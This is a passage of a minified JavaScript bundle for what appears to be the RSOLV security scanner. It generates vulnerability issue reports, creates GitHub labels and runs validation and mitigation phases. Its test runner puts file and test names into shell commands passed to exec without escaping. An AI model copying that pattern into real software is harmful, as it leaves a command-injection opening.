(SSRF)","nosql-injection":"NoSQL Injection","ldap-injection":"LDAP Injection","xpath-injection":"XPath Injection","weak-hash":"Weak Hashing Algorithm","insecure-deserialization":"Insecure Deserialization"},Q=X.type||"security-vulnerability",Y=J[Q]||Q.replace(/-/g," ").replace(/\b\w/g,(H)=>H.toUpperCase()),W=X.files.length;return`\uD83D\uDD12 ${Y} vulnerabilities found in ${W} ${W===1?"file":"files"}`}generateIssueBody(X,J){let Q=[];Q.push("## Security Vulnerability Report"),Q.push("");let Y=X.type||"security-vulnerability";Q.push(`**Type**: ${Y.replace(/-/g," ").replace(/\b\w/g,(G)=>G.toUpperCase())}`),Q.push(`**Severity**: ${X.severity.toUpperCase()}`),Q.push(`**Total Instances**: ${X.count}`),Q.push(`**Affected Files**: ${X.files.length}`),Q.push(""),Q.push("### Description"),Q.push(this.getVulnerabilityDescription(Y)),Q.push(""),Q.push("### Affected Files"),Q.push("");let W=new Map;for(let G of X.vulnerabilities){if(!G.filePath)continue;if(!W.has(G.filePath))W.set(G.filePath,[]);W.get(G.filePath).push(G)}for(let[G,H]of W){Q.push(`#### \`${G}\``),Q.push("");for(let z of H.slice(0,3))if(Q.push(`- **Line ${z.line}**: ${z.description}`),z.snippet)Q.push("  ```"+this.detectLanguageFromPath(G)),Q.push("  "+z.snippet.trim()),Q.push("  ```");if(H.length>3)Q.push(`- ... and ${H.length-3} more instances`);Q.push("")}return Q.push("### Recommendation"),Q.push(this.getVulnerabilityRecommendation(Y)),Q.push(""),Q.push("---"),Q.push("*This issue was automatically generated by RSOLV security scanner*"),Q.push(`*Repository: ${J.repository.owner}/${J.repository.name}*`),Q.push(`*Branch: ${J.repository.defaultBranch}*`),Q.push(`*Scan Date: ${new Date().toISOString()}*`),Q.join(`
`)}getVulnerabilityDescription(X){return{"sql-injection":"SQL injection vulnerabilities occur when user input is directly concatenated into SQL queries without proper sanitization or parameterization. This can allow attackers to execute arbitrary SQL commands.",xss:"Cross-Site Scripting (XSS) vulnerabilities occur when user input is rendered in HTML without proper escaping. This can allow attackers to inject malicious scripts that execute in other users' browsers.","command-injection":"Command injection vulnerabilities occur when user input is passed directly to system commands. This can allow attackers to execute arbitrary system commands on the server.","path-traversal":"Path traversal vulnerabilities occur when user input is used to construct file paths without proper validation. This can allow attackers to access files outside the intended directory.","weak-crypto":"Weak cryptography vulnerabilities occur when outdated or insecure cryptographic algorithms are used. This can make encrypted data vulnerable to decryption by attackers.","hardcoded-secret":"Hardcoded secrets in source code can be exposed if the code is leaked or accessed by unauthorized parties. This includes API keys, passwords, and other sensitive credentials.","insecure-random":"Using insecure random number generators for security-critical operations can make systems predictable and vulnerable to attacks.","open-redirect":"Open redirect vulnerabilities occur when user input is used to construct redirect URLs without validation. This can be used in phishing attacks.",xxe:"XML External Entity (XXE) vulnerabilities occur when XML parsers process external entity references. This can lead to file disclosure, SSRF, or denial of service.",ssrf:"Server-Side Request Forgery (SSRF) vulnerabilities occur when user input is used to make HTTP requests from the server. This can allow access to internal resources.","nosql-injection":"NoSQL injection vulnerabilities occur when user input is used in NoSQL queries without proper sanitization. This can allow attackers to manipulate queries and access unauthorized data.","ldap-injection":"LDAP injection vulnerabilities occur when user input is used in LDAP queries without proper escaping. This can allow attackers to modify LDAP queries and bypass authentication.","xpath-injection":"XPath injection vulnerabilities occur when user input is used in XPath queries without proper sanitization. This can allow attackers to extract sensitive data from XML documents.","weak-hash":"Weak hashing algorithms like MD5 or SHA1 are vulnerable to collision attacks and should not be used for security-critical operations.","insecure-deserialization":"Insecure deserialization vulnerabilities occur when untrusted data is deserialized without proper validation. This can lead to remote code execution."}[X]||"This type of vulnerability can compromise the security of your application."}getVulnerabilityRecommendation(X){return{"sql-injection":"Use parameterized queries or prepared statements instead of string concatenation. Never trust user input and always validate and sanitize it before use in SQL queries.",xss:"Always escape user input before rendering it in HTML. Use context-appropriate escaping functions and consider using a templating engine that provides automatic escaping.","command-injection":"Avoid executing system commands with user input. If necessary, use a whitelist of allowed values and escape shell metacharacters. Consider using language-specific APIs instead of shell commands.","path-traversal":"Validate and sanitize file paths. Use a whitelist of allowed directories and files. Resolve paths to their canonical form and ensure they stay within allowed boundaries.","weak-crypto":"Replace weak cryptographic algorithms with strong, modern alternatives. Use AES for encryption, SHA-256 or better for hashing, and ensure proper key management.","hardcoded-secret":"Remove hardcoded secrets from source code. Use environment variables, secure key management systems, or configuration files that are not committed to version control.","insecure-random":"Use cryptographically secure random number generators (CSPRNGs) for security-critical operations. Most languages provide secure alternatives to standard random functions.","open-redirect":"Validate redirect URLs against a whitelist of allowed domains. Avoid using user input directly in redirect locations.",xxe:"Disable XML external entity processing in XML parsers. Configure parsers to not resolve external entities or DTDs.",ssrf:"Validate and whitelist URLs before making requests. Implement network segmentation to limit access to internal resources.","nosql-injection":"Sanitize and validate user input before using it in NoSQL queries. Use parameterized queries where available and avoid string concatenation.","ldap-injection":"Escape special LDAP characters in user input. Use parameterized LDAP queries and validate input against expected patterns.","xpath-injection":"Use parameterized XPath queries or escape user input properly. Validate input against expected patterns and avoid dynamic query construction.","weak-hash":"Replace MD5 and SHA1 with SHA-256 or better for security operations. For password hashing, use bcrypt, scrypt, or Argon2.","insecure-deserialization":"Avoid deserializing untrusted data. If necessary, use safe serialization formats like JSON and validate the structure before processing."}[X]||"Review and fix the identified vulnerabilities according to security best practices."}detectLanguageFromPath(X){let J=X.substring(X.lastIndexOf("."));return{".js":"javascript",".jsx":"javascript",".ts":"typescript",".tsx":"typescript",".py":"python",".rb":"ruby",".java":"java",".php":"php",".ex":"elixir",".exs":"elixir"}[J]||""}}I1();I1();var Av1=[{name:"rsolv:detected",color:"FBCA04",description:"Issue detected by RSOLV security scan"},{name:"rsolv:validate",color:"0E8A16",description:"Trigger RSOLV validation phase"},{name:"rsolv:automate",color:"0052CC",description:"Trigger RSOLV fix generation"},{name:"security",color:"D93F0B",description:"Security vulnerability"},{name:"automated-scan",color:"C5DEF5",description:"Created by automated security scan"},{name:"critical",color:"B60205",description:"Critical severity"},{name:"high",color:"D93F0B",description:"High severity"},{name:"medium",color:"FBCA04",description:"Medium severity"},{name:"low",color:"0E8A16",description:"Low severity"}];async function iF(X,J,Q){U.info("Ensuring required labels exist...");try{let Y=await Dv1(X,J,Q);if(!Y)return;await wv1(X,J,Q,Y),U.info("Label check complete")}catch(Y){U.error("Failed to ensure labels exist",Y)}}async function Dv1(X,J,Q){let Y=await fetch(`https://api.github.com/repos/${X}/${J}/labels`,{headers:rF(Q)});if(!Y.ok)return U.warn(`Failed to fetch labels: ${Y.status}. Skipping label creation.`),null;let W=await Y.json();return new Set(W.map((G)=>G.name.toLowerCase()))}async function wv1(X,J,Q,Y){let W=Av1.filter((G)=>!Y.has(G.name.toLowerCase()));for(let G of W)await Nv1(X,J,Q,G)}async function Nv1(X,J,Q,Y){U.info(`Creating missing label: ${Y.name}`);let W=await fetch(`https://api.github.com/repos/${X}/${J}/labels`,{method:"POST",headers:rF(Q),body:JSON.stringify(Y)});if(!W.ok){let G=await W.text();U.warn(`Failed to create label ${Y.name}: ${G}`)}else U.info(`✅ Created label: ${Y.name}`)}function rF(X){return{Authorization:`token ${X}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"}}class y4{scanner;issueCreator;constructor(){this.scanner=new w3,this.issueCreator=new N3}async performScan(X){U.info("Starting proactive security scan");try{if(X.createIssues&&process.env.GITHUB_TOKEN)await iF(X.repository.owner,X.repository.name,process.env.GITHUB_TOKEN);let J=await this.scanner.scan(X);if(X.createIssues&&J.groupedVulnerabilities.length>0){let Q=X.maxIssues,Y=Q?Math.min(Q,J.groupedVulnerabilities.length):J.groupedVulnerabilities.length;U.info(`Creating issues for ${Y} vulnerability groups`+(Q&&J.groupedVulnerabilities.length>Q?` (limited by max_issues: ${Q})`:""));let W=J.groupedVulnerabilities.slice(0,Y),G=await this.issueCreator.createIssuesFromGroups(W,X);J.createdIssues=G,U.info(`Created ${G.length} issues`)}return this.logScanSummary(J),J}catch(J){throw U.error("Scan failed:",J),J}}logScanSummary(X){if(U.info(""),U.info("=== SECURITY SCAN SUMMARY ==="),U.info(`Repository: ${X.repository}`),U.info(`Branch: ${X.branch}`),U.info(`Files scanned: ${X.scannedFiles}/${X.totalFiles}`),U.info(`Total vulnerabilities: ${X.vulnerabilities.length}`),U.info(""),X.groupedVulnerabilities.length>0){U.info("Vulnerabilities by type:");for(let J of X.groupedVulnerabilities)U.info(`  - ${J.type} (${J.severity}): ${J.count} instances in ${J.files.length} files`);U.info("")}if(X.createdIssues.length>0){U.info("Created issues:");for(let J of X.createdIssues)U.info(`  - #${J.number}: ${J.title}`),U.info(`    ${J.url}`);U.info("")}U.info("=============================")}}WJ();m4();c4();zQ();ZG();qG();import{exec as Zx1}from"child_process";import{promisify as qx1}from"util";var Bx1=qx1(Zx1);class BG{DEFAULT_TIMEOUT=30000;async runTests(X){let J=X.timeout??this.DEFAULT_TIMEOUT,Q=this.buildCommand(X);try{let{stdout:Y,stderr:W}=await Bx1(Q,{cwd:X.workingDir,timeout:J,encoding:"utf8"});return this.createResult(!0,Y,W,!1,0)}catch(Y){if(Y.killed||Y.signal==="SIGTERM")return this.createResult(!1,Y.stdout||"",Y.stderr||"",!0,Y.code,"Test execution timed out");return this.createResult(!1,Y.stdout||"",Y.stderr||"",!1,Y.code,Y.message)}}buildCommand(X){let{framework:J,testFile:Q,testName:Y}=X,W=this.getCommandPattern(J);return this.buildCommandFromPattern(W,Q,Y)}getCommandPattern(X){let Q={jest:{base:"npx jest",testNameFlag:"-t"},vitest:{base:"npx vitest run",testNameFlag:"-t"},mocha:{base:"npx mocha",testNameFlag:"--grep"},rspec:{base:"bundle exec rspec",testNameFlag:"-e"},minitest:{base:"ruby",testNameFlag:"-n"},pytest:{base:"pytest",testNameFlag:"-k"},phpunit:{base:"vendor/bin/phpunit",testNameFlag:"--filter"},junit:{base:"mvn test",testNameFlag:"-Dtest"},testing:{base:"go test",testNameFlag:"-run"},exunit:{base:"mix test",testNameFlag:"--only"}}[X];if(!Q)throw Error(`Unsupported test framework: ${X}`);return Q}buildCommandFromPattern(X,J,Q){let Y=`${X.base} "${J}"`;if(Q)Y+=` ${X.testNameFlag} "${Q}"`;return Y}createResult(X,J,Q,Y,W,G){return{passed:X,output:J,stderr:Q,timedOut:Y,exitCode:W,error:G}}}I1();import{execSync as AJ}from"child_process";class aG{phaseDataClient;scanner;config;testGenerator;fixer;validationMode;constructor(X){this.config=X,this.phaseDataClient=new xJ(X.rsolvApiKey||X.apiKey||"",process.env.RSOLV_API_URL)}getScanner(){if(!this.scanner)this.scanner=new y4;return this.scanner}async execute(X,J){switch(U.info(`Executing in ${X} mode`,J),X){case"scan":return this.executeScan(J);case"validate":case"validate-only":if(J.issues&&J.issues.length>0)return this.executeValidateStandalone(J);else if(J.issueNumber||J.scanData)return this.executeValidate(J);else{U.info("[VALIDATE] No specific issues provided, detecting issues by label");let Q=this.config.maxIssues||5;U.info(`[VALIDATE] Detecting up to ${Q} issues with label '${this.config.issueLabel}'`);let{detectIssuesFromAllPlatforms:Y}=await Promise.resolve().then(() => (qQ(),ZQ)),W=await Y({...this.config,maxIssues:Q});if(W.length===0)throw Error(`No issues found with label '${this.config.issueLabel}'`);return U.info(`[VALIDATE] Found ${W.length} issues to validate (limited by max_issues: ${Q})`),this.executeValidateStandalone({...J,issues:W})}case"mitigate":case"fix-only":if(J.issues&&J.issues.length>0)return this.executeMitigateStandalone(J);else if(J.issueNumber)return this.executeMitigate(J);else{U.info("[MITIGATE] No specific issues provided, detecting issues by label");let Q=this.config.issueLabel||"rsolv:validated",Y=this.config.maxIssues||5;U.info(`[MITIGATE] Detecting up to ${Y} issues with label '${Q}'`);let{detectIssuesFromAllPlatforms:W}=await Promise.resolve().then(() => (qQ(),ZQ)),G=await W({...this.config,issueLabel:Q,maxIssues:Y});if(G.length===0)return U.warn(`[MITIGATE] No issues found with label '${Q}'`),{success:!1,phase:"mitigate",error:`No validated issues found with label '${Q}'. Please run validation phase first.`};return U.info(`[MITIGATE] Found ${G.length} validated issues to mitigate`),this.executeMitigateStandalone({...J,issues:G,usePriorValidation:!0})}case"validate-and-fix":if(J.issueNumber){U.info(`[VALIDATE-AND-FIX] Processing specific issue #${J.issueNumber}`);let{getIssue:Q}=await Promise.resolve().then(() => (z9(),_8)),[Y,W]=process.env.GITHUB_REPOSITORY.split("/"),G=await Q(Y,W,J.issueNumber);if(!G)throw Error(`Issue #${J.issueNumber} not found`);let H=await this.executeValidateStandalone({...J,issues:[G]});if(!H.success)return H;let z=await this.executeMitigateStandalone({...J,issues:[G],usePriorValidation:!0});return{success:z.success,phase:"validate-and-fix",message:`Processed issue #${J.issueNumber}: validation ${H.success?"succeeded":"failed"}, mitigation ${z.success?"succeeded":"failed"}`,data:{validation:H.data,mitigation:z.data}}}else{U.info("[VALIDATE-AND-FIX] No specific issue provided, detecting issues by label");let Q=this.config.maxIssues||5,{detectIssuesFromAllPlatforms:Y}=await Promise.resolve().then(() => (qQ(),ZQ)),W=await Y({...this.config,maxIssues:Q});if(W.length===0)throw Error(`No issues found with label '${this.config.issueLabel}'`);let G=await this.executeValidateStandalone({...J,issues:W}),H=await this.executeMitigateStandalone({...J,issues:W,usePriorValidation:!0});return{success:G.success&&H.success,phase:"validate-and-fix",message:`Processed ${W.length} issues`,data:{validation:G.data,mitigation:H.data}}}case"full":return this.executeAllPhases(J);default:throw Error(`Unknown mode: ${X}`)}}async executeScan(X){try{let J=X.repository;if(!J&&X.issues&&X.issues.length>0)J=X.issues[0].repository;if(!J)throw Error("Scan mode requires repository information");if(X.issues&&X.issues.length>0){let W={canBeFixed:!0,vulnerabilities:[],timestamp:new Date().toISOString(),commitHash:await this.getCurrentCommitSha()};for(let G of X.issues)try{let H=await this.executeScanForIssue(G);if(H.success&&H.data){if(W.vulnerabilities.push({issueNumber:G.number,...H.data}),!H.data.canBeFixed)W.canBeFixed=!1}}catch(H){U.warn(`Failed to scan issue #${G.number}:`,H)}return await this.storePhaseData("scan",W,{repo:`${J.owner}/${J.name}`,commitSha:W.commitHash}),{success:!0,phase:"scan",data:{scan:W}}}let Q=await this.getScanner().performScan({mode:"scan",repository:{...J,defaultBranch:J.defaultBranch||"main"},createIssues:!0,batchSimilar:!0,issueLabel:this.config.issueLabel||"rsolv:automate",enableASTValidation:process.env.RSOLV_ENABLE_AST_VALIDATION!=="false",rsolvApiKey:this.config.apiKey,maxIssues:this.config.maxIssues}),Y=X.commitSha||this.getCurrentCommitSha();return await this.storePhaseData("scan",Q,{repo:`${J.owner}/${J.name}`,commitSha:Y}),{success:!0,phase:"scan",message:`Found ${Q.vulnerabilities.length} vulnerabilities`,data:{scan:Q}}}catch(J){return U.error("Scan phase failed",J),{success:!1,phase:"scan",error:J instanceof Error?J.message:String(J)}}}async executeValidate(X){try{if(U.info("[VALIDATE] Starting RFC-058 validation phase with ValidationMode"),!X.issueNumber||!X.repository)return{success:!1,phase:"validate",error:"Validation requires an issue number and repository"};let{getIssue:J}=await Promise.resolve().then(() => (z9(),_8)),Q=await J(X.repository.owner,X.repository.name,X.issueNumber);if(!Q)return{success:!1,phase:"validate",error:`Issue #${X.issueNumber} not found`};let Y={id:`issue-${Q.number}`,number:Q.number,title:Q.title,body:Q.body||"",labels:Q.labels?.map((V)=>typeof V==="string"?V:V.name)||[],assignees:Q.assignees?.map((V)=>V.login)||[],repository:{owner:X.repository.owner,name:X.repository.name,fullName:`${X.repository.owner}/${X.repository.name}`,defaultBranch:X.repository.defaultBranch||"main"},source:"github",createdAt:Q.created_at||new Date().toISOString(),updatedAt:Q.updated_at||new Date().toISOString(),metadata:{}},{ValidationMode:W}=await Promise.resolve().then(() => (FQ(),OQ)),G=new W(this.config,process.cwd());U.info(`[VALIDATE] Using ValidationMode for RFC-058 validation of issue #${X.issueNumber}`);let H=await G.validateVulnerability(Y);if(!H.validated){U.info(`[VALIDATE] Issue #${X.issueNumber} failed validation: ${H.falsePositiveReason}`);let V=X.commitSha||this.getCurrentCommitSha();return await this.storePhaseData("validation",{[`issue-${X.issueNumber}`]:{issueNumber:H.issueId,validated:!1,falsePositiveReason:H.falsePositiveReason,timestamp:H.timestamp,commitHash:H.commitHash}},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:V}),{success:!0,phase:"validate",message:`Issue #${X.issueNumber} identified as false positive: ${H.falsePositiveReason}`,data:{validation:{issueNumber:H.issueId,validated:!1,falsePositiveReason:H.falsePositiveReason,timestamp:H.timestamp}}}}if(U.info(`[VALIDATE] ✅ Issue #${X.issueNumber} validated successfully with ValidationMode`),H.branchName)U.info(`[VALIDATE] ✅ RFC-058: Tests committed to validation branch: ${H.branchName}`);let z=X.commitSha||this.getCurrentCommitSha(),$={issueNumber:H.issueId,validated:!0,branchName:H.branchName,redTests:H.redTests,testResults:H.testResults,timestamp:H.timestamp,commitHash:H.commitHash,hasSpecificVulnerabilities:!0,vulnerabilities:[],confidence:"high"};return await this.storePhaseData("validation",{[`issue-${X.issueNumber}`]:$},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:z}),{success:!0,phase:"validate",message:H.branchName?`Validated issue #${X.issueNumber} with RFC-058 branch persistence: ${H.branchName}`:`Validated issue #${X.issueNumber} with RED tests`,data:{validation:$,rfc058Enabled:!!H.branchName}}}catch(J){return U.error("Validation phase failed",J),{success:!1,phase:"validate",error:J instanceof Error?J.message:String(J)}}}async executeMitigate(X){let J=Date.now(),Q=1800000;if(process.env.AI_TIMEOUT_OVERRIDE)Q=parseInt(process.env.AI_TIMEOUT_OVERRIDE,10),U.info(`[MITIGATE] Using timeout override: ${Q}ms`);try{if(U.info("[MITIGATE] Starting enhanced mitigation phase",{issueNumber:X.issueNumber,repository:X.repository,timestamp:new Date().toISOString(),initialTimeout:Q}),!X.issueNumber||!X.repository)return U.error("[MITIGATE] Missing required parameters"),{success:!1,phase:"mitigate",error:"Mitigation requires an issue number and repository"};U.info("[MITIGATE] Step 1: Fetching issue from GitHub...");let{getIssue:Y}=await Promise.resolve().then(() => (z9(),_8)),W=Y(X.repository.owner,X.repository.name,X.issueNumber),G=new Promise((i,L1)=>setTimeout(()=>L1(Error("GitHub API timeout after 30s")),30000)),H;try{H=await Promise.race([W,G]),U.info("[MITIGATE] Step 1 complete: Successfully fetched issue from GitHub")}catch(i){return U.error("[MITIGATE] Step 1 failed: Error fetching issue from GitHub:",i),{success:!1,phase:"mitigate",error:`Failed to fetch issue: ${i instanceof Error?i.message:String(i)}`}}if(!H)return{success:!1,phase:"mitigate",error:`Issue #${X.issueNumber} not found`};U.info("[MITIGATE] Analyzing issue for file count...");let z=H.body||"",$=H.title||"",V=1,K=$.match(/(\d+)\s+files?/i)||z.match(/(\d+)\s+files?/i);if(K)V=parseInt(K[1],10),U.info(`[MITIGATE] Detected ${V} files from issue description`);if(V>3){let L1=Math.max(Q,V*60000);U.info(`[MITIGATE] Adjusting timeout for ${V} files: ${Q}ms -> ${L1}ms`),Q=L1}U.info("[MITIGATE] Step 2: Retrieving validation data...");let Z=X.commitSha||this.getCurrentCommitSha(),q;try{let i=this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,Z),L1=new Promise((G0,U0)=>setTimeout(()=>U0(Error("Phase data retrieval timeout after 15s")),15000));q=await Promise.race([i,L1]),U.info("[MITIGATE] Step 2 complete: Retrieved validation data",{hasData:!!q,keys:q?Object.keys(q):[]})}catch(i){U.warn("[MITIGATE] Step 2 warning: Failed to retrieve validation data:",i),q=null}U.info("[MITIGATE] Checking labels...",{labels:H.labels,labelType:typeof H.labels,isArray:Array.isArray(H.labels)});let B=Array.isArray(H.labels)?H.labels.map((i)=>typeof i==="string"?i:i.name||""):[],M=B.includes("rsolv:automate"),O=B.includes("rsolv:validated");if(U.info("[MITIGATE] Label check complete",{labelNames:B,hasAutomateLabel:M,hasValidatedLabel:O}),!q?.validation&&M&&!O){U.info("[MITIGATE] Step 3: No validation found, running VALIDATE phase first");try{let i=this.executeValidate(X),L1=new Promise((n,d)=>setTimeout(()=>d(Error("Validation timeout after 60s")),60000)),G0=await Promise.race([i,L1]);if(!G0.success)return U.error("[MITIGATE] Step 3 failed: Auto-validation failed"),{success:!1,phase:"mitigate",error:`Auto-validation failed: ${G0.error}`,data:{validationAttempted:!0}};U.info("[MITIGATE] Step 3a: Validation succeeded, retrieving stored data...");let U0=this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,Z),C0=new Promise((n,d)=>setTimeout(()=>d(Error("Phase data retrieval timeout after 15s")),15000));q=await Promise.race([U0,C0]),U.info("[MITIGATE] Step 3 complete: Validation data retrieved")}catch(i){return U.error("[MITIGATE] Step 3 failed:",i),{success:!1,phase:"mitigate",error:`Validation phase error: ${i instanceof Error?i.message:String(i)}`,data:{validationError:!0}}}}U.info("[MITIGATE] Step 4: Checking validation data...");let R;try{let i=`issue-${X.issueNumber}`;U.info("[MITIGATE] Looking for validation with key:",i),U.info("[MITIGATE] Available validation data:",{hasValidationData:!!q,validationKeys:q?Object.keys(q):[],validationProp:q?.validation?Object.keys(q.validation):[],validateProp:q?.validate?Object.keys(q.validate):[]}),R=q?.validation?.[i]||q?.validate?.[i],U.info("[MITIGATE] Validation lookup result:",{found:!!R,validationType:R?typeof R:"undefined"})}catch(i){return U.error("[MITIGATE] Error accessing validation data:",i),{success:!1,phase:"mitigate",error:`Failed to access validation data: ${i instanceof Error?i.message:String(i)}`,data:{validationAccessError:!0}}}if(!R||typeof R!=="object")return U.warn("[MITIGATE] No validation data found for issue or invalid type",{validationType:typeof R,validation:R}),{success:!1,phase:"mitigate",error:"No validation data available. Please run validation first or add rsolv:automate label.",data:{validationRequired:!0}};U.info("[MITIGATE] Step 4 complete: Validation data found"),U.info("[MITIGATE DEBUG] Validation data structure:",JSON.stringify(R,null,2));let I=R,F=I.hasSpecificVulnerabilities??(I.vulnerabilities&&I.vulnerabilities.length>0);if(U.info("[MITIGATE DEBUG] Vulnerability check:",{hasSpecificVulnerabilities:F,hasSpecificVulnerabilitiesField:"hasSpecificVulnerabilities"in I,vulnerabilitiesLength:I.vulnerabilities?.length||0,validationKeys:Object.keys(I)}),!F)return U.warn("[MITIGATE] No specific vulnerabilities found - validation may have failed"),U.warn("[MITIGATE DEBUG] Validation object:",R),{success:!1,phase:"mitigate",error:"No specific vulnerabilities found during validation. This may be a false positive.",data:{validation:R,falsePositive:!0}};let T=I.vulnerabilities||[],b=I.overallConfidence||I.confidence||"medium";U.info("[MITIGATE] DEBUG: Vulnerability data structure:",{vulnerabilityCount:T.length,firstVulnerability:T[0]?JSON.stringify(T[0]):"none",vulnerabilityKeys:T[0]?Object.keys(T[0]):[],validationKeys:Object.keys(I)}),U.info("[MITIGATE] Step 4a: Parsing issue body to extract real filenames...");let{parseIssueBody:h,enhanceValidationData:L}=await Promise.resolve().then(() => (mA(),gA)),N=h(z);if(T.length>0&&N.files.length>0)T=L(I,N).vulnerabilities,U.info("[MITIGATE] Step 4a complete: Enhanced validation data with real filenames",{originalFiles:I.vulnerabilities?.map((L1)=>L1.filePath||L1.file)||[],enhancedFiles:T.map((L1)=>L1.filePath||L1.file),filesFixed:T.filter((L1,G0)=>L1.file!==I.vulnerabilities?.[G0]?.file).length});else U.warn("[MITIGATE] Step 4a: Could not enhance validation data",{hasVulnerabilities:T.length>0,hasParsedFiles:N.files.length>0});if(b==="review"||b==="low")U.warn(`[MITIGATE] Low confidence (${b}) - requiring manual review`);let k={...H,validationData:R,specificVulnerabilities:T};U.info("[MITIGATE] Step 5: Checking for vendor files and multi-file vulnerabilities...");let{ChunkingIntegration:_}=await Promise.resolve().then(() => (PG(),iA)),{VendorDetectionIntegration:c}=await Promise.resolve().then(() => (sA(),nA)),{ExtendedConversationIntegration:a}=await Promise.resolve().then(() => tA),J1=process.env.USE_EXTENDED_CONVERSATION!=="false",q1=J1?new a:new _,_1=new c,{extractFilesFromVulnerabilities:M1}=await Promise.resolve().then(() => (JD(),XD)),k1=M1(T,"MITIGATE");if(k1.length>3)Q=Math.max(Q,k1.length*60000),U.info(`[MITIGATE] Adjusted timeout for ${k1.length} files: ${Q}ms`);let r=await Promise.all(k1.map(async(i)=>({file:i,isVendor:await _1.isVendorFile(i)})));if(U.info("[MITIGATE] Vendor detection results:",{totalFiles:k1.length,vendorFiles:r.filter((i)=>i.isVendor).map((i)=>i.file),nonVendorFiles:r.filter((i)=>!i.isVendor).map((i)=>i.file)}),r.some((i)=>i.isVendor)){U.info("[MITIGATE] RFC-047: Vendor files detected, handling as vendor vulnerability");let i=await _1.processVulnerability({...k,files:k1,vendorFiles:r.filter((L1)=>L1.isVendor).map((L1)=>L1.file)});if(i.action==="issue_created")return{success:!0,phase:"mitigate",message:"Vendor library vulnerability detected. Update recommendation created instead of patch.",data:i}}let m=k1.length;if(J1?q1.shouldUseExtendedConversation({files:k1,vulnerabilities:T}):q1.shouldChunk({files:k1,vulnerabilities:T})){let i=J1?"extended conversation":"chunking";U.info(`[MITIGATE] RFC-046: Multi-file vulnerability (${m} files) will use ${i}`);let G0=await q1[J1?"processWithExtendedConversation":"processWithChunking"]({...k,files:k1,type:T[0]?.type||"UNKNOWN"},X.issueNumber);if(G0.success||G0.chunked)return{success:!0,phase:"mitigate",message:J1?"Multi-file vulnerability fixed in single PR using extended conversation":`Multi-file vulnerability chunked into ${G0.chunks} PRs for manageable fixes`,data:G0};if(G0.requiresManual)return{success:!1,phase:"mitigate",error:"Vulnerability too complex for automated fixing",data:{...G0,manualGuide:G0.guide}}}U.info("[MITIGATE] Step 4: Checking for RFC-058/RFC-060 validation branch...");let{MitigationMode:F1}=await Promise.resolve().then(() => (zD(),HD)),f1=new F1(this.config,process.cwd(),this.phaseDataClient),b1=!1;try{U.info("[MITIGATE] Fetching remote branches for RFC-058 validation branches...");let{execSync:i}=await import("child_process");try{i("git fetch origin",{cwd:process.cwd(),encoding:"utf8"}),U.info("[MITIGATE] Remote branches fetched successfully")}catch(G0){U.warn("[MITIGATE] Could not fetch remote branches:",G0)}let L1=`rsolv/validate/issue-${X.issueNumber}`;try{i(`git rev-parse --verify origin/${L1}`,{cwd:process.cwd()}),b1=!0,U.info(`[MITIGATE] RFC-058: Validation branch found: origin/${L1}`)}catch{U.info("[MITIGATE] No validation branch found, using standard mitigation")}}catch(i){U.warn("[MITIGATE] Error checking for validation branch:",i)}if(b1){U.info("[MITIGATE] RFC-058: Using test-aware fix generation with validation tests");let i=await f1.generateTestAwareFix(H);U.info("[MITIGATE] Test-aware context generated:",{branchCheckedOut:i.branchCheckedOut,testFilesFound:i.testFilesFound}),k.testContext=i,k.hasValidationTests=i.testFilesFound>0,k.validationBranch=i.branchCheckedOut?f1.getCurrentBranch():void 0}if(U.info(`[MITIGATE] Generating fix for ${T.length} validated vulnerabilities`),this.config.aiProvider?.useVendedCredentials&&!this.config.rsolvApiKey)return U.error("[MITIGATE] Vended credentials enabled but RSOLV_API_KEY is missing"),{success:!1,phase:"mitigate",error:"RSOLV_API_KEY is required for vended credentials but was not provided",data:{credentialError:!0}};U.info("[MITIGATE] Step 4: Importing AI processor...");let{processIssues:p1}=await Promise.resolve().then(() => (fD(),vD));U.info("[MITIGATE] Step 4 complete: AI processor imported successfully");let X0=Date.now()-J,m1=Q-X0;if(m1<=0)return U.error("[MITIGATE] Overall timeout exceeded before processing"),{success:!1,phase:"mitigate",error:"Mitigation timeout exceeded",data:{timeout:!0,elapsed:X0}};U.info("[MITIGATE] Step 5: Starting AI processing...",{remainingTime:Math.round(m1/1000)+"s",vulnerabilityCount:T.length,hasVendedCredentials:this.config.aiProvider?.useVendedCredentials,hasRsolvApiKey:!!this.config.rsolvApiKey});let C1;try{let i=p1([k],this.config),L1=new Promise((G0,U0)=>setTimeout(()=>U0(Error(`AI processing timeout after ${Math.round(m1/1000)}s`)),m1));C1=await Promise.race([i,L1]),U.info("[MITIGATE] Step 5 complete: AI processing finished",{hasResults:!!C1,resultCount:C1?.length||0,firstResult:C1?.[0]?Object.keys(C1[0]):[]})}catch(i){return U.error("[MITIGATE] Step 5 failed: Error during processIssues:",i),{success:!1,phase:"mitigate",error:`Failed to process issue: ${i instanceof Error?i.message:String(i)}`,data:{processingError:!0,elapsed:Date.now()-J}}}let J0=`issue-${X.issueNumber}`,o1;if(C1&&C1.length>0&&C1[0].pullRequestUrl){let i=C1[0];o1={fixed:!0,prUrl:i.pullRequestUrl,prNumber:i.pullRequestUrl?parseInt(i.pullRequestUrl.split("/").pop()||"0"):0,filesModified:[],vulnerabilitiesFixed:T.length,usedValidationData:!0,validationConfidence:b,timestamp:new Date().toISOString()}}else{let i=C1?.[0]?.error||C1?.[0]?.message||"Unknown error during fix generation";return U.error("[MITIGATE] Failed to generate fix",{error:i,result:C1?.[0],hasResult:C1?.length>0}),{success:!1,phase:"mitigate",error:`Failed to generate fix: ${i}`,data:{processingResults:C1,validation:R}}}U.info("[MITIGATE] Step 6: Storing mitigation results...");try{let i=this.storePhaseData("mitigation",{[J0]:o1},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:Z}),L1=new Promise((G0,U0)=>setTimeout(()=>U0(Error("Store timeout after 10s")),1e4));await Promise.race([i,L1]),U.info("[MITIGATE] Step 6 complete: Mitigation results stored")}catch(i){U.warn("[MITIGATE] Step 6 warning: Failed to store results (non-fatal):",i)}let v1=Date.now()-J;return U.info("[MITIGATE] SUCCESS: Mitigation 